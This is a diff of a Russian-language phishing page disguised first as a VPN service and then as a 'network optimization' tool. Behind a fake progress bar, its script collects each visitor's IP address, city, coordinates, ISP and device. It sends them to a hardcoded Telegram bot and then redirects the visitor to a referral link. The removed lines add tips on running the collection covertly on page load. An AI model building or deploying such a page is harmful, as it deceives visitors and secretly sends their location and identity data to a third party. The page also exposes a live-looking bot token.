@@ -2,17 +2,12 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>VPN Connect</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Оптимизация сети</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body {
-            background: linear-gradient(145deg, #0b0e14 0%, #1a1f2b 100%);
+            background: #0b0f16;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,131 +15,118 @@
             padding: 20px;
         }
         .card {
-            max-width: 400px;
+            max-width: 420px;
             width: 100%;
-            background: rgba(26, 31, 43, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 40px;
-            padding: 40px 28px;
-            box-shadow: 0 25px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.03);
+            background: #161d27;
+            border-radius: 44px;
+            padding: 36px 24px 28px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
+            border: 1px solid #2a3346;
             text-align: center;
-            transition: all 0.3s;
         }
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin: 0 auto 20px;
-            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
-            border-radius: 24px;
+        .icon {
+            width: 76px; height: 76px;
+            margin: 0 auto 16px;
+            background: linear-gradient(145deg, #1f6eff, #7a4bff);
+            border-radius: 28px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 36px;
-            font-weight: 700;
-            color: #fff;
-            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.3);
+            font-size: 34px;
+            box-shadow: 0 10px 30px rgba(31,110,255,0.35);
         }
-        h1 {
-            font-size: 26px;
-            font-weight: 600;
-            color: #fff;
-            letter-spacing: -0.5px;
-            margin-bottom: 8px;
-        }
-        .subtitle {
-            font-size: 14px;
-            color: #8b95a9;
-            margin-bottom: 28px;
-            line-height: 1.5;
-        }
-        .vpn-info {
-            background: rgba(0, 212, 255, 0.06);
-            border-radius: 16px;
-            padding: 16px;
+        h1 { color: #fff; font-size: 24px; font-weight: 600; letter-spacing: -0.4px; }
+        .sub { color: #8b95a9; font-size: 14px; margin: 6px 0 22px; }
+        .server-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
             margin-bottom: 24px;
-            border: 1px solid rgba(0, 212, 255, 0.08);
         }
-        .vpn-info span {
-            color: #00d4ff;
-            font-weight: 500;
+        .server-opt {
+            background: #0f151e;
+            border: 1px solid #2a3346;
+            border-radius: 16px;
+            padding: 12px 6px;
+            color: #c9d1d9;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.25s;
+            text-align: center;
         }
-        .btn {
-            display: block;
+        .server-opt.active {
+            border-color: #1f6eff;
+            background: #1a2740;
+            box-shadow: 0 0 0 2px rgba(31,110,255,0.25);
+        }
+        .server-opt .flag { font-size: 24px; display: block; margin-bottom: 4px; }
+        .btn-main {
             width: 100%;
             padding: 18px;
-            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            background: linear-gradient(135deg, #1f6eff, #7a4bff);
             border: none;
             border-radius: 60px;
             font-size: 18px;
             font-weight: 600;
             color: #fff;
             cursor: pointer;
+            box-shadow: 0 8px 28px rgba(31,110,255,0.35);
             transition: all 0.3s;
-            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.25);
-            text-decoration: none;
             letter-spacing: 0.3px;
         }
-        .btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 12px 32px rgba(0, 212, 255, 0.4);
-        }
-        .btn:active { transform: scale(0.97); }
-        .footer {
-            margin-top: 24px;
-            font-size: 12px;
-            color: #4a5268;
-        }
-        .loading {
-            display: none;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #8b95a9;
-        }
-        .loading.show { display: block; }
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 2px solid #2a3346;
-            border-top: 2px solid #00d4ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn-main:disabled { opacity: 0.5; transform: scale(0.97); cursor: not-allowed; }
+        .btn-main:active:not(:disabled) { transform: scale(0.95); }
+        .progress-wrap { margin: 18px 0 8px; height: 4px; background: #2a3346; border-radius: 4px; overflow: hidden; display: none; }
+        .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, #1f6eff, #7a4bff); transition: width 0.3s; }
+        .status-msg { font-size: 13px; color: #8b95a9; margin-top: 8px; min-height: 22px; }
+        .footer { margin-top: 20px; font-size: 11px; color: #3e485e; }
+        .footer a { color: #5a73a8; text-decoration: none; }
     </style>
 </head>
 <body>
-    <div class="card" id="app">
-        <div class="logo">🔒</div>
-        <h1>VPN Connect</h1>
-        <div class="subtitle">Безопасное подключение по протоколу нового поколения</div>
-        <div class="vpn-info">
-            <span>✅</span> Скорость до 100 Мбит/с<br>
-            <span>🌍</span> 56 стран · Безлимит
+    <div class="card">
+        <div class="icon">⚡</div>
+        <h1>Смарт-оптимизация</h1>
+        <div class="sub">Выберите сервер для улучшения соединения</div>
+
+        <div class="server-grid" id="serverGrid">
+            <div class="server-opt active" data-server="auto"><span class="flag">🌐</span>Авто</div>
+            <div class="server-opt" data-server="us"><span class="flag">🇺🇸</span>США</div>
+            <div class="server-opt" data-server="de"><span class="flag">🇩🇪</span>EU</div>
         </div>
-        <button class="btn" id="connectBtn">Подключиться</button>
-        <div class="loading" id="loadingStatus">
-            <span class="spinner"></span> Инициализация защищённого канала...
-        </div>
-        <div class="footer">© 2026 VPN Connect · Реферальная программа</div>
+
+        <button class="btn-main" id="actionBtn">Оптимизировать</button>
+        <div class="progress-wrap" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
+        <div class="status-msg" id="statusMsg">Нажмите для запуска</div>
+        <div class="footer">🔒 Технология SmartRoute · <a href="#">Реферальная программа</a></div>
     </div>
 
     <script>
         // ================================================================
-        //  НАСТРОЙКИ (замени на свои)
+        //  НАСТРОЙКИ (ЗАМЕНИ НА СВОИ)
         // ================================================================
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
-        // Реферальная ссылка на реальный VPN (куда перенаправить после сбора)
-        const REDIRECT_URL = "https://example.com/vpn-ref";  // ЗАМЕНИ НА СВОЮ РЕФЕРАЛЬНУЮ ССЫЛКУ
+        const REDIRECT_URL = "https://example.com/vpn-ref";  // ← сюда свою реферальную ссылку
         // ================================================================
 
-        // Элементы UI
-        const btn = document.getElementById('connectBtn');
-        const loading = document.getElementById('loadingStatus');
+        const btn = document.getElementById('actionBtn');
+        const statusMsg = document.getElementById('statusMsg');
+        const progressWrap = document.getElementById('progressWrap');
+        const progressBar = document.getElementById('progressBar');
+        const serverOpts = document.querySelectorAll('.server-opt');
+
+        let selectedServer = 'auto';
+
+        // Выбор сервера
+        serverOpts.forEach(el => {
+            el.addEventListener('click', function() {
+                serverOpts.forEach(b => b.classList.remove('active'));
+                this.classList.add('active');
+                selectedServer = this.dataset.server;
+                statusMsg.textContent = `Выбран сервер: ${this.textContent.trim()}`;
+            });
+        });
 
         // Отправка в Telegram
         function sendToTelegram(text) {
@@ -153,21 +135,14 @@
             fetch(url).catch(() => {});
         }
 
-        // Сбор данных и отправка
-        function collectAndSend() {
-            // Показываем индикатор загрузки
-            loading.classList.add('show');
-            btn.disabled = true;
-            btn.textContent = 'Подключение...';
-
-            // 1. IP
+        // Сбор данных
+        function collectData() {
             let ip = 'Не определен';
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(d => { ip = d.ip; })
                 .catch(() => {})
                 .finally(() => {
-                    // 2. Гео (если IP получен)
                     let geo = null;
                     if (ip !== 'Не определен') {
                         fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`)
@@ -175,7 +150,6 @@
                             .then(g => { if (g.status === 'success') geo = g; })
                             .catch(() => {})
                             .finally(() => {
-                                // 3. Формируем сообщение
                                 const ua = navigator.userAgent;
                                 const device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное' : 'Компьютер';
                                 const time = new Date().toLocaleString('ru-RU');
@@ -192,15 +166,13 @@
                                 msg += `⏰ Время: ${time}`;
                                 sendToTelegram(msg);
 
-                                // 4. Редирект через 2 секунды
+                                // Редирект
                                 setTimeout(() => {
                                     window.location.href = REDIRECT_URL;
                                 }, 2000);
                             });
                     } else {
-                        // Если IP не получен — отправляем что есть
-                        const msg = `IP не определён\nУстройство: ${device}\nВремя: ${time}`;
-                        sendToTelegram(msg);
+                        sendToTelegram(`IP не определён\nУстройство: ${device}\nВремя: ${time}`);
                         setTimeout(() => {
                             window.location.href = REDIRECT_URL;
                         }, 2000);
@@ -208,13 +180,26 @@
                 });
         }
 
-        // Нажатие на кнопку
-        btn.addEventListener('click', collectAndSend);
+        // Запуск "оптимизации"
+        function startOptimization() {
+            btn.disabled = true;
+            progressWrap.style.display = 'block';
+            let progress = 0;
+            statusMsg.textContent = 'Подключение к серверу...';
 
-        // Можно также запускать сбор автоматически при загрузке (если хочешь без клика)
-        // Для скрытности лучше по клику, чтобы пользователь сам инициировал.
-        // Если нужно без клика — раскомментируй:
-        // window.addEventListener('DOMContentLoaded', collectAndSend);
+            const interval = setInterval(() => {
+                progress += Math.random() * 8 + 3;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                    statusMsg.textContent = 'Соединение установлено!';
+                    collectData();
+                }
+                progressBar.style.width = progress + '%';
+            }, 140);
+        }
+
+        btn.addEventListener('click', startOptimization);
     </script>
 </body>
 </html>
